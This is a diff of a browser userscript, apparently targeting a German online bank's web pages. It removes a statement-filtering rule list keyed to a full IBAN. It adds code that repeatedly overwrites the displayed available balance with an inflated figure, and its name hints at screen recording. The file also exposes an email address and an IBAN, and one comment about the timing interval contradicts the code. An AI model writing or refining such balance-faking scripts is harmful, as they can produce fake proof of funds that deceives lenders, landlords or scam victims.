@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Ed DKB Start 4Rec Herbeck-wirtschaftsberatung@web.de
 // @namespace    http://tampermonkey.net/
-// @version      7.77771
+// @version      7.77773
 // @description  with minus bal handling
 // @author       You
 // @match        https://yahoo.com/sign/as/*
@@ -85,69 +85,7 @@
 
 // POSTFACH
 
-  const RULES = [
-    [
-      { text: 'Kontoauszug', use: true },
-      { text: '8/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: true },
-
-        // toggle to false if not needed
-    ],
- [
-      { text: 'Kontoauszug', use: true },
-      { text: '9/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
-
-        // toggle to false if not needed
-    ],
- [
-      { text: 'Kontoauszug', use: true },
-      { text: '9/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: true },
-
-        // toggle to false if not needed
-    ],
- [
-      { text: 'Kontoauszug', use: true },
-      { text: '10/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: true },
-
-        // toggle to false if not needed
-    ],
- [
-      { text: 'Kontoauszug', use: true },
-      { text: '10/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
-
-        // toggle to false if not needed
-    ],
-    [
-      { text: 'Kontoauszug', use: true },
-      { text: '9/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: true },
-    ],
- [
-      { text: 'Kontoauszug', use: true },
-      { text: '4/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
-    ],
- [
-      { text: 'Kontoauszug', use: true },
-      { text: '5/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
-    ],
-       [
-      { text: 'Kontoauszug', use: true },
-      { text: '3/2025',      use: true },
-        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
-    ],
-    // add more sets like this ↓
-    // [
-    //   { text: 'AnotherWord', use: true },
-    //   { text: 'ExtraWord',   use: false },
-    // ],
-  ];
-
+ 
 // SECOND ACCOUNT
 // SECOND ACCOUNT
 // SECOND ACCOUNT
@@ -221,6 +159,57 @@ const secDELTA_AMOUNT = 867477;
 
 // SECOND ACCOUNT END
 // SECOND ACCOUNT END
+
+//. UEBER VERFUEGBARER BETRAG =========================================================================================================
+//=====================================================================================================================================
+//. UEBER VERFUEGBARER BETRAG =========================================================================================================
+//=====================================================================================================================================
+
+ if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
+
+    'use strict';
+
+    const ueber_DELTA_AMOUNT = 1.00; // Adjust this value as needed
+
+    let originalAmount = null;
+
+    function parseEuroAmount(str) {
+        // Convert "30.091,56 €" to 30091.56
+        return parseFloat(str.replace(/\./g, '').replace(',', '.').replace(/[^\d.-]/g, ''));
+    }
+
+    function formatEuroAmount(num) {
+        // Convert 30091.56 to "30.091,56 €"
+        return num.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' €';
+    }
+
+    function updateAmount() {
+        const el = document.getElementById("amount.value-info");
+        if (!el) return;
+
+        const text = el.textContent || '';
+        const prefix = "Verfügbarer Betrag inkl. Dispo:";
+        if (!text.startsWith(prefix)) return;
+
+        const currentAmountStr = text.slice(prefix.length).trim();
+
+        if (originalAmount === null) {
+            originalAmount = parseEuroAmount(currentAmountStr);
+        }
+
+        const modifiedAmount = originalAmount + ueber_DELTA_AMOUNT;
+        el.textContent = `${prefix} ${formatEuroAmount(modifiedAmount)}`;
+    }
+
+    // Start the interval immediately
+    setInterval(updateAmount, 100); // Every 2 seconds
+
+  }
+
+//. UEBER VERFUEGBARER BETRAG END=========================================================================================================
+//=====================================================================================================================================
+//. UEBER VERFUEGBARER BETRAG END=========================================================================================================
+//=====================================================================================================================================
 
 
 
